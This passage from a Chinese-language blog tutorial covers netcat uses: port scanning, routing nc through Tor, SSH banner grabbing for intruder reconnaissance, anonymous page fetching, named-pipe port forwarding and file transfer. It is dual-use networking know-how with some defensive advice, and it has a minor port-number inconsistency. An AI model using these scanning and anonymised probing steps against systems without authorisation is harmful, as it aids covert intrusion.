<code>-l</code></strong><br>　　这个选项会让 nc 进入监听模式。</p><p><strong>选项 <code>-p</code></strong><br>　　这个选项有“选项值”，也就是具体端口号。</p><p>　　然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达（具体的命令行参见前一章节“招数1”）</p><h3 id="◇补充说明：是否省略“-p”？"><a href="#◇补充说明：是否省略“-p”？" class="headerlink" title="◇补充说明：是否省略“-p”？"></a>◇补充说明：是否省略“-p”？</h3><p>　　某些 nc 的变种，在开启监听模式时，可以省略“<code>-p</code>”，上述命令变为如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>　　但考虑到兼容性，（在后续章节中）俺总是写上 <code>-p</code> 选项。</p><h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。<br>　　为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。<br>　　如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 <code>-k</code> 选项。</p><h3 id="◇补充说明：UDP-1"><a href="#◇补充说明：UDP-1" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　上述举例是基于 TCP 协议。如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 <code>-u</code> 选项。</p><h2 id="★招数3：（渗透测试）用-nc-玩“端口扫描”"><a href="#★招数3：（渗透测试）用-nc-玩“端口扫描”" class="headerlink" title="★招数3：（渗透测试）用 nc 玩“端口扫描”"></a>★招数3：（渗透测试）用 nc 玩“端口扫描”</h2><h3 id="◇使用场景-2"><a href="#◇使用场景-2" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　在“招数1”里面介绍了：如何测试【单个】端口是否可达。<br>　　扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。<br>　　“端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。<br>　　作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。<br>　　顺便说一下：<br>不论是 TCP 还是 UDP，协议规定的【有效】端口号范围都是：<code>1</code> ~ <code>65535</code></p><h3 id="◇方法-2"><a href="#◇方法-2" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　下面这个命令，用来扫描 IP 地址为 <code>x.x.x.x</code> 的主机，扫描的端口范围从 <code>1</code> 到 <code>1024</code></p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -znv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> <span class="hljs-number">1</span><span class="hljs-number">-1024</span><br></code></pre></td></tr></table></figure><p><strong>选项 <code>-z</code></strong><br>　　意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。<br><strong>选项 <code>-n</code></strong><br>　　（前面已聊过，参见“招数1”）<br><strong>选项 <code>-v</code></strong><br><code>-v</code> 选项前面也聊过，这里要特地强调一下。<br>　　对 nc 的其它用法，<code>-v</code> 选项是可加可不加滴；但对于“端口扫描”而言，一定要有这个选项——否则你【看不到】扫描结果。</p><h3 id="◇补充说明：优化输出"><a href="#◇补充说明：优化输出" class="headerlink" title="◇补充说明：优化输出"></a>◇补充说明：优化输出</h3><p>　　玩“端口扫描”的时候，“<code>-v</code> 选项”会把“成功/失败”的结果统统打印出来。<br>　　通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -znv x.x.x.x <span class="hljs-number">1</span>-<span class="hljs-number">1024</span>  <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep succeeded<br></code></pre></td></tr></table></figure><p>　　由于“<code>-v</code> 选项”产生的输出位于【stderr】，上述命令中的 <code>2&gt;&amp;1</code> 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）<br><code>grep</code> 命令用来进行【过滤】。对于 Windows 系统，默认【没有】<code>grep</code> 命令，需改用 <code>find</code> 命令过滤。</p><h3 id="◇补充说明：超时设置-1"><a href="#◇补充说明：超时设置-1" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——<br>超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了）<br>　　具体如何设置，参见“招数1”的“补充说明”。</p><h3 id="◇补充说明：【并发】扫描"><a href="#◇补充说明：【并发】扫描" class="headerlink" title="◇补充说明：【并发】扫描"></a>◇补充说明：【并发】扫描</h3><p>　　如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。<br>　　简而言之就是：同时运行多个 nc，分别扫描不同的端口范围。</p><h2 id="★招数4：（隐匿性）如何让-nc-走暗网（以-Tor-为例）"><a href="#★招数4：（隐匿性）如何让-nc-走暗网（以-Tor-为例）" class="headerlink" title="★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）"></a>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</h2><h3 id="◇使用场景-3"><a href="#◇使用场景-3" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　如果你想用 nc 干一些“不为人知”的事情，首先要考虑的是——如何消除【网络层面】的踪迹。<br>　　最容易想到的当然就是——让 nc 走暗网（比如 Tor）。本文以下部分称之为【nc over Tor】。<br>　　顺便说一下：“原版 nc”【不支持】代理，而 nc 的“OpenBSD 变种”支持各种代理。这是两种 nc 之间的关键性差异之一。</p><h3 id="◇方法-3"><a href="#◇方法-3" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　为了支持代理，nc 的“OpenBSD 变种”增加了两个选项：<code>-X</code> 与 <code>-x</code></p><p><strong>选项 <code>-x</code></strong><br>　　该选项表示【代理的位置】，以 <code>x.x.x.x:xxx</code> 的形式表示（中间是【半角冒号】）。</p><p><strong>选项 <code>-X</code></strong><br>　　该选项表示【代理的类型】，含义如下：</p><table><thead><tr><th>选项值</th><th>含义</th></tr></thead><tbody><tr><td>5</td><td>SOCKS5 代理</td></tr><tr><td>4</td><td>SOCKS4 代理</td></tr><tr><td>connect</td><td>CONNECT 型的 HTTP 代理</td></tr></tbody></table><p>　　首先，确保你本机已经运行了 Tor；<br>　　然后，拿俺的域名测试一下。如果 nc 的输出中包含 <code>succeeded</code>（参见下面的第2行），说明 OK 啦——nc 已经能通过 Tor 联网。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-X</span> 5 <span class="hljs-selector-tag">-x</span> 127.0.0.1<span class="hljs-selector-pseudo">:9050</span> <span class="hljs-selector-tag">-q</span> 3 <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">program-think</span><span class="hljs-selector-class">.blogspot</span><span class="hljs-selector-class">.com</span> 443<br><br><span class="hljs-selector-tag">Connection</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">program-think</span><span class="hljs-selector-class">.blogspot</span><span class="hljs-selector-class">.com</span> 443 <span class="hljs-selector-tag">port</span> <span class="hljs-selector-attr">[tcp/https]</span> <span class="hljs-selector-tag">succeeded</span>!<br></code></pre></td></tr></table></figure><p>（注：如果你用的是“Tor Browser”，上述命令中的“<code>-x</code> 选项值”改为 <code>127.0.0.1:9150</code>）</p><h3 id="◇补充说明：延时退出"><a href="#◇补充说明：延时退出" class="headerlink" title="◇补充说明：延时退出"></a>◇补充说明：延时退出</h3><p>　　在上述举例中，俺用到了一个新的 <code>-q</code> 选项。主要考虑到：本博客的 Web Server 位于【公网】。<br>　　当你用 nc 连接【公网】上的服务器，因为【公网】的传输质量会受到诸多因素的影响，最好加 <code>-q</code> 选项，让 nc【延时】退出。<br>　　在俺的示例中，延时3秒。实际操作时，要根据你的网络环境调整。</p><h3 id="◇补充说明：Tor-暗网的好处"><a href="#◇补充说明：Tor-暗网的好处" class="headerlink" title="◇补充说明：Tor 暗网的好处"></a>◇补充说明：Tor 暗网的好处</h3><p>　　关于 Tor 的用处/好处，俺在博客上重复唠叨的次数，已经数不清了。<br>　　（简而言之）由于 Tor 暗网的线路会经历“三级跳”＆“三重套”，而且其线路每隔10分钟就会【随机】变换一次。这种变态的玩法，可以让【网络层面】的逆向追溯变得非常非常困难。</p><h3 id="◇补充说明：域名解析"><a href="#◇补充说明：域名解析" class="headerlink" title="◇补充说明：域名解析"></a>◇补充说明：域名解析</h3><p>　　当你用刚才的招数做到【nc over Tor】之后，一旦 nc 的网络行为需要解析域名，会自动通过 Tor 的 SOCKS 代理进行【远程域名解析】。<br>　　也就是说，“DNS 协议”相关数据流也经过 Tor 暗网——这样既可以【防止】“域名解析”暴露你的网络行为，还可以避免 GFW 的“域名污染”。</p><h3 id="◇补充说明：设置别名（alias）"><a href="#◇补充说明：设置别名（alias）" class="headerlink" title="◇补充说明：设置别名（alias）"></a>◇补充说明：设置别名（alias）</h3><p>　　如果你比较懒，觉得每次都输入上述两个代理选项太麻烦，可以为 nc 设置一个【别名】（命令如下）</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">alias nc-tor=&#x27;nc -X 5 -x 127.0.0.1:<span class="hljs-number">9050</span>&#x27;<br></code></pre></td></tr></table></figure><p>　　设置好之后，你只要用 <code>nc-tor</code> 就可以自动追加代理选项。<br>　　如果想让别名【永久】生效，要把上述命令加入到：你当前使用的 shell 的启动文件中。<br>　　再次唠叨：“裸 Tor”与“Tor Browser”的监听端口有差异。俺上述命令的 <code>9050</code> 是用于“裸 Tor”。</p><h2 id="★招数5：（信息收集）用-nc-探测“服务器类型”和“软件版本”（以-SSH-为例）"><a href="#★招数5：（信息收集）用-nc-探测“服务器类型”和“软件版本”（以-SSH-为例）" class="headerlink" title="★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）"></a>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）</h2><h3 id="◇使用场景-4"><a href="#◇使用场景-4" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　入侵者在发起攻击之前，有一个很重要的步骤叫做【信息收集】。攻击者对目标了解得越多，得手的机会就越大。<br>　　下面俺以 SSH Server（sshd）举例。</p><h3 id="◇方法-4"><a href="#◇方法-4" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　如今要【远程管理】服务器，最常用的大概就是 SSH 这种方式了。<br>　　如果某个服务器运行了 SSH 服务端（默认监听端口是 <code>22</code>），那么用如下命令可以看出：该服务器的操作系统类型，以及 SSH server 的版本。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP <span class="hljs-number">22</span><br><span class="hljs-attribute">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p><strong>选项 <code>-v</code></strong><br>　　玩这招时，最好加 <code>-v</code> 选项——nc 会先显示“端口已经连上”或者“端口连不上”。</p><p><strong>选项 <code>-q</code></strong><br>　　（关于该选项的说明，参见“招数4”章节的【延时退出】）</p><p><strong><code>nc-tor</code> 别名</strong><br>　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）</p><p>　　前面聊了这么久，一直没有给出【实例】。现在来一个【真实的】例子——用 nc 探测 Github 的 SSH 端口<br>　　（注：在如下终端窗口中，头一行是命令，后面两行是输出）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;EXIT&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> ssh.github.<span class="hljs-keyword">com</span> <span class="hljs-number">22</span><br><br>Connection <span class="hljs-keyword">to</span> ssh.github.<span class="hljs-keyword">com</span> <span class="hljs-number">22</span> port [tcp/ssh] succeeded!<br>SSH-<span class="hljs-number">2.0</span>-babeld-dae25663<br></code></pre></td></tr></table></figure><h3 id="◇补充说明：echo-命令"><a href="#◇补充说明：echo-命令" class="headerlink" title="◇补充说明：echo 命令"></a>◇补充说明：echo 命令</h3><p>　　上述用到的 <code>echo</code> 命令是 POSIX 下常用的命令。Windows 的命令行中也有同名的命令，但功能/用法有【差异】。</p><h3 id="◇补充说明：批处理-＆-自动化"><a href="#◇补充说明：批处理-＆-自动化" class="headerlink" title="◇补充说明：批处理 ＆ 自动化"></a>◇补充说明：批处理 ＆ 自动化</h3><p>　　某些“有心人”甚至可以搞一个脚本，批量探测某个 IP 地址段的 22 端口，然后把找到的服务器信息保存在某个文件中。<br>　　另外，<br>　　有的系统管理员会把 sshd 的监听端口从 <code>22</code> 改为其它数值，想要迷惑攻击者。但这么干，【效果不大】。<br>　　攻击者可以先进行端口扫描，拿到所有已开启的 TCP 监听端口；然后利用上述方法，对这些 TCP 端口进行【自动化】探测，从而判断出哪个端口是 SSH Server。</p><h3 id="◇补充说明：防范措施"><a href="#◇补充说明：防范措施" class="headerlink" title="◇补充说明：防范措施"></a>◇补充说明：防范措施</h3><p>　　本章节以“SSH Server”举例来说明入侵者如何探测服务端的软件版本。<br>　　除了“SSH Server”，很多其它的服务端软件，也存在类似的【信息暴露】。<br>　　一个谨慎的系统管理员，应该通过定制，【消除 or 伪造】这些信息，从而增加入侵者的攻击成本。</p><h2 id="★招数6：（隐匿性）用-nc-实现【彻底无痕】的-Web-访问"><a href="#★招数6：（隐匿性）用-nc-实现【彻底无痕】的-Web-访问" class="headerlink" title="★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问"></a>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问</h2><h3 id="◇使用场景-5"><a href="#◇使用场景-5" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　有时候，俺想要看某个 Web 服务器上的某个页面的内容，但是又【不希望】在那上面留下俺本人的任何痕迹。这里所说的“痕迹”既包括【网络】层面滴，也包括【操作系统 ＆ 软件】层面滴。<br>　　要搞定【网络】层面，很简单——主要靠【暗网】（Tor or I2P），来掩盖你的【真实】“公网 IP”。具体的玩法，前面章节已经聊过啦。<br>　　要搞定【操作系统 ＆ 软件】层面，稍微麻烦一点。如果你用传统的浏览器（Chrome、Firefox、IE、Edge …）访问了某个页面。即使你禁用了 JS，伪造了浏览器的“User Agent”。但如果 Web 服务器想要收集你的系统指纹，还是有若干办法——可以通过浏览器的一些差异，获得某些信息量（安全行话叫做“浏览器指纹”）。<br>　　比如说：HTTP 协议的【Header】字段可能会包含某些信息。<br>　　比如说：不同内核的浏览器，对页面的渲染会有差异。对页面中的【外部】元素（图片、JS、CSS …）的加载效率也会有差异。<br>　　比如说：即使同一款浏览器，在不同系统平台上，依然会表现出某些差异。<br>　　……</p><p>　　此时，nc 再度派上用场——你可以用 nc 直接抓取页面，保存到本机。<br>　　这种玩法相当于——让 nc 在【裸 TCP】层面执行 HTTP 协议的命令。在整个过程中，浏览器完全【不】参与其中。既【不会】暴露浏览器的信息，也【不会】暴露操作系统的信息。</p><h3 id="◇方法-5"><a href="#◇方法-5" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　先执行下列两个命令的其中一个（具体看你想用“IP”还是“域名”）</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 端口<br>echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> / HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP 端口<br></code></pre></td></tr></table></figure><p>　　然后 nc 就会把这个页面抓下来，打印到命令行终端。这时候你看到的是【HTML 源代码】。</p><p>　　上述命令访问的是 Web Server 的【根路径】。如果你想要看其它路径的页面（比如说：<code>/index.html</code>），稍微修改成如下：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.html HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> 服务器域名 端口<br>echo -e <span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /index.html HTTP/1.0\r\n\r\n&quot;</span> | nc-tor -vq <span class="hljs-number">5</span> -n 服务器IP 端口<br></code></pre></td></tr></table></figure><p>　　由于正常人类是无法直接阅读【HTML 源代码】滴。为了更加人性化，你可以把 nc 抓下来的 HTML 源代码，（在命令行中用“大于号”）重定向到某个 HTML 文件，然后就可以用你本机的浏览器阅读之。</p><p><strong><code>nc-tor</code> 别名</strong><br>　　（关于这个别名，已经“招数4”章节聊过——是让 nc 走 Tor 代理）</p><p><strong>选项 <code>-q</code></strong><br>　　（关于该选项的说明，参见“招数4”章节的【延时退出】）</p><h3 id="◇补充说明：HTTP-协议"><a href="#◇补充说明：HTTP-协议" class="headerlink" title="◇补充说明：HTTP 协议"></a>◇补充说明：HTTP 协议</h3><p><strong>协议版本</strong><br>　　有些同学会奇怪——为啥俺上述的示例用的是 1.0 而不是 1.1？<br>　　主要是为了偷懒——按照 RFC 的规范，HTTP 1.1 的 Request 中，<code>Host</code> 是【必须】的字段；而在 HTTP 1.0 中，这个字段是【可选】滴。</p><p><strong>HTTPS</strong><br>　　nc 的“OpenBSD 变种”还【不】支持 HTTPS（SSL/TLS）。<br>　　在本文末尾介绍的其它变种里面，ncat ＆ socat 已经完全支持 SSL/TLS 协议。<br>　　由于本文主要介绍 nc 的“OpenBSD 变种”，关于 ncat ＆ socat 的话题，就不展开啦。</p><h3 id="◇补充说明：这种方式的【缺点】"><a href="#◇补充说明：这种方式的【缺点】" class="headerlink" title="◇补充说明：这种方式的【缺点】"></a>◇补充说明：这种方式的【缺点】</h3><p><strong>关于“页面的【外部】元素”</strong><br>　　用这招，nc 只抓取页面本身，不包括页面中的外部元素（图片、JS、CSS …）。<br>　　这种方式拿到的页面，阅读的时候会显得比较丑陋（你就凑合着看吧）</p><p><strong>关于“JS 引擎”</strong><br>　　由于这招只是在 TCP 层面模拟了简单的 HTTP 协议。所以只能得到【静态 HTML】。<br>　　如果某个页面的内容是依靠【前端 JS】动态生成（所谓的 AJAX 风格），那这招就不灵啦（因为 nc【没有】JS 引擎）。</p><h2 id="★招数7：（网络配置）基于-nc-的端口转发（Port-Forward）"><a href="#★招数7：（网络配置）基于-nc-的端口转发（Port-Forward）" class="headerlink" title="★招数7：（网络配置）基于 nc 的端口转发（Port Forward）"></a>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）</h2><h3 id="◇使用场景-6"><a href="#◇使用场景-6" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　关于【端口转发】的相关概念，有啥用处和好处，那篇都已经写了。这里就不再重复唠叨啦。<br>　　在当年那篇教程中，俺主要聊了两个工具，分别是是 rinetd 和 netsh。当年为啥没有介绍 netcat 捏？因为 nc 的功能太强，所谓“杀鸡焉用牛刀”。相比之下，rinetd 的使用非常简单，而 netsh 是 Windows 内置滴工具。<br>　　今天就把当年没聊的给补一下——如何用 nc 玩“端口转发”。</p><h3 id="◇原理"><a href="#◇原理" class="headerlink" title="◇原理"></a>◇原理</h3><p>　　用 nc 进行端口转发，需要运行【两个】nc 进程，一个充当“服务端”，另一个是“客户端”，然后用【管道】让把两个进程的“标准输入输出”交叉配对。所谓的“交叉配对”就是——每一个 nc 进程的“标准输出”都【对接】到另一个 nc 进程的“标准输入”。如此一来，就可以完美地建立【双向通讯】。<br>　　玩过命令行的同学，应该都知道：大部分 shell 都支持【管道符】（就是那个竖线符号 <code>|</code>），可以把某个进程的标准输出，重定向给另一个进程的标准输入。但是 shell 的“管道符”只能做到“单向配对”，【无法】做到“交叉配对”。所以还需要再借助另一个管道——也就是“命名管道”。<br>　　“命名管道”洋文叫做“named pipe”，是一种进程间通讯（IPC）的机制。顾名思义，“命名管道”就是有名号滴，而 shell 中使用的那个【管道符】，其本质上是“匿名管道”（无名管道）。<br>　　主流的操作系统（Windows、Linux、UNIX）都支持“命名管道”这种机制。由于俺本人的环境是 Linux，下面只以 Linux 举例。</p><h3 id="◇方法-6"><a href="#◇方法-6" class="headerlink" title="◇方法"></a>◇方法</h3><p><strong>步骤1：创建命名管道</strong><br>　　用下面这个简单的命令创建一个“命名管道”，其名称叫做 <code>nc_pipe</code>。（俺用这个名称只是为了举例，你也可以用别的名称）</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">mkfifo nc_pipe</span><br></code></pre></td></tr></table></figure><p><strong>步骤2：同时启动两个 nc</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">1234</span> &lt; nc_pipe | nc <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">5678</span> &gt; nc_pipe<br></code></pre></td></tr></table></figure><p>　　运行上述命令之后，就可以把本机的 <code>1235</code> 端口重定向到本机的 <code>5678</code> 端口。</p><p>　　这个命令有点复杂。技术菜鸟如果看不懂，就算了（没关系滴，不影响你看后续的章节）。<br>　　如果你比较喜欢刨根问底，俺稍微解释一下：<br>　　上述命令行中，前一个 nc 充当【服务端】，后一个 nc 充当【客户端】。命令行中的“管道符”使得“服务端 nc”的输出绑定到“客户端 nc”的输入。然后再用 <code>nc_pipe</code> 这个命名管道做中转，使得“客户端 nc”的输出绑定到“服务端 nc”的输入。从而完成了【交叉配对】。</p><h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】-1"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】-1" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　参见“招数2”章节中的“补充说明”。</p><h2 id="★招数8：（网络配置）基于-nc-的代理转发（Proxy-Forward）"><a href="#★招数8：（网络配置）基于-nc-的代理转发（Proxy-Forward）" class="headerlink" title="★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）"></a>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）</h2><h3 id="◇使用场景-7"><a href="#◇使用场景-7" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　提醒一下：<br>　　【不要混淆】本章节与“招数4”。<br>　　“招数4”聊的是——nc 自己通过代理进行网络访问（nc over Tor）。<br>　　“本章节”聊的是——nc 帮助其它网络软件走代理进行网络访问（XX软件 over nc over Tor）。</p><p>　　比如说，SSH 是很常用的一个安全工具——用来远程操作服务器。<br>　　在某些特殊场合，俺想要通过 SSH 登录某个服务器，但是又【不希望】服务器记录俺本人【真实的】“公网 IP”（“暴露【真实的】公网 IP”等同于“暴露真实身份”）<br>　　说到这里，很多老读者肯定猜到俺说啥——让 SSH 走 Tor 代理（SSH over Tor）。<br>　　但可惜的是：（POSIX 系统中常用的）OpenSSH 客户端【不支持】SOCKS 代理，而 Tor 默认提供的是 SOCKS 代理。这时候，netcat 就派上用场啦——用 nc 把 SSH 的数据流转发到 Tor 的 SOCKS 代理。</p><h3 id="◇方法-7"><a href="#◇方法-7" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　由于 Github 同时提供了几种不同的访问途径（Web、Git、SSH）。对【每一种】Github 的访问方式，俺都介绍了相应的隐匿措施。<br>　　对 SSH 这种访问方式，当时俺介绍的招数就是——用 nc 进行代理转发（把 SSH 的数据流转发到 Tor）<br>　　既然当年已经聊过了，这里就不重复唠叨啦。对这招感兴趣的同学，请猛击上述链接。</p><h3 id="◇补充说明：“SSH-over-Tor”与“Tor-over-SSH”"><a href="#◇补充说明：“SSH-over-Tor”与“Tor-over-SSH”" class="headerlink" title="◇补充说明：“SSH over Tor”与“Tor over SSH”"></a>◇补充说明：“SSH over Tor”与“Tor over SSH”</h3><p>　　即使懂技术的同学，有时候也会混淆这两者。俺顺便澄清一下：</p><p><strong>Tor over SSH</strong><br>　　这种方式相当于 SSH 作为 Tor 的前置代理。假设你有一个墙外的 SSH server，而且没有被 GFW 屏蔽，就可以用这招，让你的 Tor 客户端通过这个 SSH server 联网。</p><p><strong>SSH over Tor</strong><br>　　这是让 SSH 通过 Tor 网络（暗网）连接到 SSH 服务器，从而隐藏 SSH 客户端的【真实】公网 IP。在这种情况下，SSH 服务器看到的访问者 IP 是“Tor 出口节点的公网 IP”。</p><h2 id="★招数9：（系统管理）用-nc-传输文件"><a href="#★招数9：（系统管理）用-nc-传输文件" class="headerlink" title="★招数9：（系统管理）用 nc 传输文件"></a>★招数9：（系统管理）用 nc 传输文件</h2><h3 id="◇使用场景-8"><a href="#◇使用场景-8" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　有时候，你需要在两台电脑之间传输文件。也可以用 nc 搞定。<br>　　俺猜到某些技术小白会问：为啥不用 Windows 的共享目录？<br>　　反驳的理由很多——<br>反驳1：这个玩意儿只能在 Windows 上用。<br>反驳2：为了使用“共享目录”，需要启用（Enable）系统中的好几个 service，这会增加你系统的【攻击面】。<br>反驳3：启用的 service 越多，占用的内容也越多，影响性能。<br>……<br>　　还有些同学会问：为啥不用 FTP、SSH（或诸如此类的东东）？<br>　　俺觉得：<br>1、如果只是临时传一个文件，还要额外再去装某某软件的客户端/服务端，岂不是很蛋疼？<br>2、任何服务端软件，（从某种意义上说）都是在【增加攻击面】。</p><h3 id="◇方法-8"><a href="#◇方法-8" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　为了叙述方便，假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2</p><p>　　你先在【接收端】（B 主机）运行如下命令（其中的 <code>xxx</code> 是端口号）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p xxx &gt; file<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>　　然后在【发送端】（A 主机）运行如下命令。</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xxx &lt; file1<br></code></pre></td></tr></table></figure><p>　　第二条命令中的 <code>xxx</code> 是端口号，要与第一条命令中的端口号相同；第二条命令中的 <code>x.x.x.x</code> 是【主机 B】的 IP 地址。</p><h3 id="◇补充说明：nc-的性能优势"><a href="#◇补充说明：nc-的性能优势" class="headerlink" title="◇补充说明：nc 的性能优势"></a>◇补充说明：nc 的性能优势</h3><p>　　用 nc 传输文件，相当于是：直接在【裸 TCP】层面传输。你可以通俗理解为：【没有】应用层。<br>　　（不熟悉网络分层的同学，再去复习一下本文开头的 OSI 模型）<br>　　如果你传输的文件【超级大】或者文件数量【超级多】，用 nc 传输文件的性能优势会很明显（相比“FTP、SSH、共享目录…”而言）</p><h2 id="★招数10：（系统管理）用-nc-远程备份整个磁盘"><a href="#★招数10：（系统管理）用-nc-远程备份整个磁盘" class="headerlink" title="★招数10：（系统管理）用 nc 远程备份整个磁盘"></a>★招数10：（系统管理）用 nc 远程备份整个磁盘</h2><h3 id="◇使用场景-9"><a href="#◇使用场景-9" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　当你学会“用 nc 传输文件”，还可以用 nc【复制整个硬盘】。<br>　　无论是对“系统管理员”，还是对“入侵者”甚至是“数据取证人员”，这招都是蛮有用滴。</p><p>　　考虑到某些读者是“技术菜鸟”，俺稍微说明一下。<br>　　“磁盘复制”【不同于】“在两块磁盘之间复制文件”。两者之间有很多差别，至少包括：<br><strong>性能差异</strong>——如果“源盘”上有非常多的小文件，“在两块磁盘之间复制文件”就会【非常慢】。<br><strong>完整性差异</strong>——“磁盘复制”可以确保两块盘的内容是完全一致滴。而如果你仅仅在两块磁盘之间复制文件，很多信息都损失掉了。<br>　　